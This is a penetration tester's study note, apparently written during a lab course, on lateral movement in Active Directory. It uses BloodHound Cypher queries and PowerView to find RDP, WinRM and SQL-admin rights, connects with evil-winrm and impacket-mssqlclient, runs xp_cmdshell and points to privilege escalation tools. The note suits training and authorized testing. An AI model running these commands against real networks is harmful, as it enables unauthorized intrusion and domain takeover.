 # 1- Privileged Access
Once we gain a foothold in a domain, the next step is to move laterally or escalate privileges to reach domain compromise. 
1.  ==If we already have local admin rights==, **we can use Pass-the-Hash over SMB.** 

2. ==If not==, **we can still pivot using other remote access methods:**
     **Remote Desktop Protocol (RDP)** → GUI access if the user has Remote Desktop privileges
     **PowerShell Remoting  (WinRm)** → command execution if the user has Remote Management rights
     **MSSQL Server (SQLAdmin)** → sysadmin rights allow remote login and OS command execution through the SQL service account

These paths can be discovered via tools like BloodHound, PowerView, or built-in enumeration.
as the following edges exist to show us what types of remote access privileges a given user has:
- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
- [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)

## Check Local Admin Rights for Domain Users
**In BloodHound, click on Domain Users object >> Analysis Tab >> run “Find computers where group has local admin rights”  Queries  → view results.**
## Remote Desktop
1.  **if we control a local admin user -> we can access it via RDP**
2. - ==if we control a **Domain User** don't have the local admin Right== **but does have the rights to RDP into one or more machines.** 
         we could use the new host position to:
         1. Launch further attacks
        2. We may be able to escalate privileges and obtain credentials for a higher privileged user
         3. We may be able to pillage the host for sensitive data or credentials
#### Enumerating the Remote Desktop Users Group
**Using PowerView,** we could  enumerating members of the `Remote Desktop Users` group on a given host
```powershell
import-module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
#=> MemberName   : <DOMIAN>\Domain Users  
```
[+] ==find **Domain Users  group** (`all` users in the domain) can RDP to the Host==
>  Such Hosts may contain sensitive data or privilege escalation opportunities, allowing us to gain local admin rights and steal higher-privileged credentials for further domain access.
#### Checking  Domain Users Group has RDP Rights  
Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
**In BloodHound, Click on Domain Users Group Object >> Node info >> Execution Right >> ==First Degree RDP Privileges==**
![[Pasted image 20250819210757.png]]
#### Check User have RDP Right
**In BloodHound, Click on the  User  Object >> Node info >> Execution Right >> ==First Degree RDP Privilege==s**
![[Pasted image 20250819212242.png]]

>CanRDP
#### pre-built queries
We could also check the `Analysis` tab and run the pre-built queries ==Find Workstations where Domain Users can RDP== or ==Find Servers where Domain Users can RDP==.
#### Connect 
To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

## WinRM
Like RDP, WinRM access may be granted to a user or group, sometimes even low-privileged, which can be leveraged for data hunting, privilege escalation, or local admin access.
#### Enumerating the WinRm Group Members
```powershell
import-module PowerView.ps1
Get-NetLocalGroupMember -ComputerName <COMPUTER-NAME> -GroupName "Remote Management Users" 
  #=> MemberName   : <DOMAIN>\<USER>
```
#### Enum WinRm Users with BloodHound
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20250821223031.png]]
> CanPSRemote
#### Connect to WinRM from Windows
```powershell
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

hostname #=> <winrm-computer-2>
Exit-PSSession #=> exit 
```
#### Connect to WinRM from Linux
```bash
evil-winrm -i 10.129.201.234 -u forend
```

## SQL Server Admin
we will encounter SQL servers in the environments we face. It is common ==to find user and service accounts set up with sysadmin privileges on a given SQL server instance.==

We may obtain SQL Service credentials for an account via:
- 1.  Kerberoasting (common)
-  2.  LLMNR/NBT-NS Response Spoofing
-  3.  password spraying
- 4.  search for creds on share files (using Snaffler)  to find web.config or other config files

#### Enum MSSQL Server Admin Users 

We can check for `SQL Admin Rights` in the `Node Info` tab for a given user
![[Pasted image 20250821225046.png]]

or use this custom Cypher query to search: (better + fast)
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
![[Pasted image 20250821225156.png]]
[+] ==find `<USER-2>`. (damundsen) + we already have a ALC right to change the password of that User using User-1== 
Let's assume we changed the account password to `<New-PASSWORD>` using our ACL rights. We can now authenticate and run operating system commands.

#### Enumerating MSSQL Instances with PowerUpSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
# DomainAccount  : Useer-2 ==> domain account do have sysadmin privileges under which the SQL Server service is running.
# Spn: MSSQLSvc/<SQL-Server-Name.LOCAL>:1433  
```

#### Connect to MSSQL From Windows
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLQuery -Verbose -Instance "<SQL-SERVER-IP>,1433" -username "<DOMAIN>\<USER-2>" -password "NEW-PASS" -query 'Select @@version'
```
#### Connect to MSSQL From
```bash
impacket-mssqlclient <DOMAIN>/<USER-2>@<SQL-SERVER-IP> -windows-auth
enable_xp_cmdshell
# xp_cmdshell <command>.
xp_cmdshell whoami /priv    # check the MSSQL Account priv on the server
  # SeAssignPrimaryTokenPrivilege 
  # SeImpersonatePrivilege   
```
[+] ==find `SeImpersonate and SeAssignPrimaryToken` so we can  escalate to `SYSTEM` level privileges (using tools such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato))==
